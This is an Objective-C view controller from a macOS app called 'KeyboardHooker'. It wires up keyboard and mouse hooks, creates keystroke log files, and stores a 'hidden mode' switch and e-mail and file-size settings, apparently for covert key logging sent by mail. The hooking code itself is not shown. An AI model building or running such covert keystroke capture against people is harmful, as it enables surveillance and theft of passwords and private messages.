//
//  ViewController.m
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "ViewController.h"
#import <SystemConfiguration/SystemConfiguration.h>

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    // Array for showing blocked keys
    _buttonsBlockArray = [[NSMutableArray alloc] init];
    
    [_emailTextField setDelegate:self];
    [_fileSize setDelegate:self];
    
    // Setting tableView
    [_tableView setDelegate:self];
    [_tableView setDataSource:self];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(editingDidEnd:) name:NSControlTextDidEndEditingNotification object:nil];
    
    // Creating files for log
    [FileManager createFile:@"keys"];
    [FileManager createFile:@"buttons"];
    
    // Mouse hooker
    _mouse = [[MouseHooker alloc] init];
    
    // Keyboard hooker
    _key = [[KeyHooker alloc] init:_mouse];
    _keyBlocker = [[BlockKeyManager alloc] init:_buttonsBlockArray :self];
    
    // Setting notification and runloop
    _runloop = [[KeyRunLoop alloc] init:_key :_keyBlocker];
    [_runloop setRunLoop];
    //[KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void*)(self)];
    [_mouse setMouseNotifications];
}

// Set hidden mode switch according to config file
- (void)viewWillAppear {
    NSInteger state = [ConfigManager getCurrentState];
    if (state != -1) {
        [_hiddenModeSwitch setState:state];
    }
}

// MARK: - Value of hidden mode switch changed
- (IBAction)hiddenModeSwitchChanged:(id)sender {
    [ConfigManager updateState:[sender state]];
}

// MARK: - Controlling e-mail and file size NSTextField input
- (void)controlTextDidChange: (NSNotification*)notification {
    NSTextField *textField = [notification object];
    
    if ([textField tag] == 1) {
        if (![RegexManager validateEmail:[_emailTextField stringValue]]) {
            [_emailTextField setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            emailFlag = NO;
        } else {
            [_emailTextField setTextColor:[NSColor blackColor]];
            emailFlag = YES;
        }
    }
    
    if ([textField tag] == 2) {
        if ([[textField stringValue] length] >= 7) {
            [textField setStringValue:[[textField stringValue] substringToIndex:[[textField stringValue] length] - 1]];
        }
        if (![RegexManager validateDigitsOnly:[_fileSize stringValue]]) {
            [_fileSize setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            sizeFlag = NO;
        } else {
            [_fileSize setTextColor:[NSColor blackColor]];
            sizeFlag = YES;
        }
    }
    
    if (emailFlag && sizeFlag) {
        [_saveButton setEnabled: YES];
    }
}

// MARK: - User clicked "Save changes" button
- (IBAction)clickedSaveButton:(id)sender {
    [ConfigManager updateConfig:[_emailTextField stringValue] Size:[_fileSize stringValue] State:[_hiddenModeSwitch state]];
}

// MARK: - BlockKeyManager delegate methods
- (void)reloadTable {
    [_tableView reloadData];
}

- (void)unlockAddButton {
    [_addBlockButton setEnabled:YES];
}

// MARK: - TableView delegate methods
- (NSView*)tableView:(NSTableView *)tableView viewForTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    NSTableCellView *cellView = [tableView makeViewWithIdentifier:@"Button" owner:self];
    
    if ([tableColumn.identifier isEqualToString:@"Button"]) {
        cellView = [tableView makeViewWithIdentifier:@"b" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld (%@)", (long)_buttonsBlockArray[row].key,
                         [KeycodeEncrypter keyStringFromKeyCode:(long long)_buttonsBlockArray[row].key]];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
    } else if ([tableColumn.identifier isEqualToString:@"DelayTime"]) {
        cellView = [tableView makeViewWithIdentifier:@"d" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld", (long)_buttonsBlockArray[row].delay];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
    } else if ([tableColumn.identifier isEqualToString:@"BlockKeys"]) {
        cellView = [tableView makeViewWithIdentifier:@"k" owner:self];
        NSString *str = _buttonsBlockArray[row].blockKeys;
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@""];
        }
    }
    
    return cellView;
}

- (NSInteger)numberOfRowsInTableView:(NSTableView *)tableView {
    return [_buttonsBlockArray count];
}

- (void)tableViewSelectionDidChange:(NSNotification *)notification {
    NSInteger row = [notification.object selectedRow];
    if (row >= 0) {
        selectedRow = row;
    }
}

- (void)editingDidEnd: (NSNotification*)notification {
    NSString *text = [[notification object] stringValue];
    
    if ([[notification object] tag] == 1000) {
        if ([RegexManager validateDigitsOnly:text]) {
            _buttonsBlockArray[selectedRow].delay = [text integerValue];
            [_tableView reloadData];
        } else {
            [[notification object] setStringValue:[NSString stringWithFormat:@"%ld", _buttonsBlockArray[selectedRow].delay]];
        }
    } else if ([[notification object] tag] == 1001) {
        NSString *key = [KeycodeEncrypter keyStringFromKeyCode:_buttonsBlockArray[selectedRow].key];
        if ([text containsString:key] == NO) {
            _buttonsBlockArray[selectedRow].blockKeys = [NSMutableString stringWithFormat:@"%@", text];
            [_tableView reloadData];
        } else {
            [[notification object] setStringValue:_buttonsBlockArray[selectedRow].blockKeys];
        }
        
    }
}

// MARK: - Block key buttons
- (IBAction)clickedDeleteButton:(id)sender {
    NSInteger currentRow = [_tableView selectedRow];
    if (currentRow >=0) {
        [_buttonsBlockArray removeObjectAtIndex:currentRow];
        [_tableView reloadData];
    }
}

- (IBAction)addKey:(id)sender {
    [[self keyBlocker] setPressAddFlag:YES];
    [sender setEnabled:false];
}

@end
